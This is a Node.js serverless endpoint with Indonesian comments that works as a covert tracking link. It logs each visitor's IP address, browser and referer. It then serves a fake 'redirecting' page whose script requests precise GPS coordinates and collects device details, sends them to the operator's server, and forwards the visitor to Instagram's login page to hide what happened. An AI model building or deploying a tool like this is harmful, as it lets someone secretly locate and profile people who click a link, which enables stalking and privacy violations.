// API untuk tracking
const fs = require('fs').promises;
const path = require('path');

// Konfigurasi
const LOG_FILE = path.join(process.cwd(), 'tracker_logs.txt');
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.instagram.com/accounts/login/';

// In-memory logs untuk demo di Vercel
let inMemoryLogs = [];

// Fungsi untuk mendapatkan IP sebenarnya
function getClientIP(req) {
  return req.headers['x-forwarded-for'] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         'unknown';
}

// Fungsi untuk mendapatkan informasi perangkat
function getDeviceInfo(userAgent) {
  let device = "Tidak diketahui";
  let browser = "Tidak diketahui";
  let os = "Tidak diketahui";
  
  // Deteksi perangkat mobile
  if (/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)) {
    device = "Mobile";
  } 
  // Deteksi tablet
  else if (/android|ipad|playbook|silk/i.test(userAgent)) {
    device = "Tablet";
  } 
  // Deteksi desktop
  else {
    device = "Desktop";
  }
  
  // Browser
  if (/MSIE|Trident/i.test(userAgent)) {
    browser = "Internet Explorer";
  } else if (/Firefox/i.test(userAgent)) {
    browser = "Mozilla Firefox";
  } else if (/Chrome/i.test(userAgent)) {
    browser = "Google Chrome";
  } else if (/Safari/i.test(userAgent)) {
    browser = "Safari";
  } else if (/Opera/i.test(userAgent)) {
    browser = "Opera";
  } else if (/Netscape/i.test(userAgent)) {
    browser = "Netscape";
  }
  
  // OS
  if (/windows|win32/i.test(userAgent)) {
    os = "Windows";
  } else if (/macintosh|mac os x/i.test(userAgent)) {
    os = "Mac OS";
  } else if (/android/i.test(userAgent)) {
    os = "Android";
  } else if (/iphone|ipad|ipod/i.test(userAgent)) {
    os = "iOS";
  } else if (/linux/i.test(userAgent)) {
    os = "Linux";
  }
  
  return { device, browser, os, user_agent: userAgent };
}

// Fungsi untuk menyimpan log
async function saveLog(data) {
  try {
    console.log('Saving log:', data);
    
    // Simpan ke memory
    inMemoryLogs.push(data);
    
    // Jika di development, coba simpan ke file
    if (process.env.NODE_ENV !== 'production') {
      try {
        const logData = JSON.stringify(data);
        const logEntry = `${new Date().toISOString()} | ${logData}\n`;
        
        await fs.appendFile(LOG_FILE, logEntry);
        console.log('Log saved to file');
      } catch (error) {
        console.error('Error saving log to file:', error);
      }
    }
  } catch (error) {
    console.error('Error saving log:', error);
  }
}

// Fungsi untuk mendapatkan logs (untuk diakses dari file lain)
function getLogs() {
  return inMemoryLogs;
}

module.exports = async (req, res) => {
  console.log('API tracker called with method:', req.method);
  
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Handle OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Ambil informasi dasar
  const ip = getClientIP(req);
  const userAgent = req.headers['user-agent'] || 'unknown';
  const deviceInfo = getDeviceInfo(userAgent);
  const referer = req.headers['referer'] || 'Direct';
  const trackingId = req.query.id || 'unknown';
  const timestamp = new Date().toISOString();
  
  // Data untuk disimpan
  const logData = {
    tracking_id: trackingId,
    timestamp: timestamp,
    ip: ip,
    device: deviceInfo.device,
    browser: deviceInfo.browser,
    os: deviceInfo.os,
    referer: referer,
    user_agent: deviceInfo.user_agent
  };
  
  // Simpan log
  await saveLog(logData);
  
  // Jika ini adalah permintaan POST untuk menyimpan lokasi
  if (req.method === 'POST') {
    const { latitude, longitude, accuracy } = req.body;
    
    const locationData = {
      tracking_id: trackingId,
      timestamp: new Date().toISOString(),
      ip: ip,
      latitude: latitude || 'unknown',
      longitude: longitude || 'unknown',
      accuracy: accuracy || 'unknown',
      type: "location_update"
    };
    
    await saveLog(locationData);
    
    // Kembalikan respons
    return res.status(200).json({ status: "success" });
  }
  
  // Jika ini adalah permintaan GET, kembalikan HTML untuk tracking
  const html = `
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Mengalihkan...</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 50px;
                background-color: #f8f9fa;
            }
            .loader {
                border: 5px solid #f3f3f3;
                border-top: 5px solid #3498db;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                background-color: white;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Mengalihkan ke halaman tujuan...</h2>
            <div class="loader"></div>
            <p>Mohon tunggu sebentar, Anda akan dialihkan dalam beberapa detik.</p>
        </div>
        
        <script>
            // Fungsi untuk mendapatkan lokasi
            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        // Success callback
                        function(position) {
                            // Kirim data lokasi ke server
                            var xhr = new XMLHttpRequest();
                            xhr.open("POST", window.location.href, true);
                            xhr.setRequestHeader("Content-Type", "application/json");
                            xhr.onreadystatechange = function() {
                                if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                                    // Redirect setelah data lokasi terkirim
                                    window.location.href = "${REDIRECT_URL}";
                                }
                            }
                            xhr.send(JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            }));
                        },
                        // Error callback
                        function(error) {
                            console.log("Error getting location: " + error.message);
                            // Redirect meskipun gagal mendapatkan lokasi
                            setTimeout(function() {
                                window.location.href = "${REDIRECT_URL}";
                            }, 2000);
                        },
                        // Options
                        {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        }
                    );
                } else {
                    console.log("Geolocation is not supported by this browser.");
                    // Redirect jika geolocation tidak didukung
                    setTimeout(function() {
                        window.location.href = "${REDIRECT_URL}";
                    }, 2000);
                }
            }
            
            // Kumpulkan informasi tambahan tentang perangkat
            function collectDeviceInfo() {
                var deviceInfo = {
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
                    },
                    browser: {
                        language: navigator.language,
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        onLine: navigator.onLine,
                        platform: navigator.platform,
                        vendor: navigator.vendor
                    },
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : 'unknown'
                };
                
                // Kirim informasi tambahan
                var xhr = new XMLHttpRequest();
                xhr.open("POST", window.location.href, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({
                    device_info: deviceInfo
                }));
            }
            
            // Jalankan fungsi saat halaman dimuat
            window.onload = function() {
                // Kumpulkan informasi perangkat
                collectDeviceInfo();
                
                // Coba dapatkan lokasi
                getLocation();
            };
        </script>
    </body>
    </html>
  `;
  
  // Set header dan kembalikan HTML
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(html);
};

// Ekspor fungsi getLogs
module.exports.getLogs = getLogs; 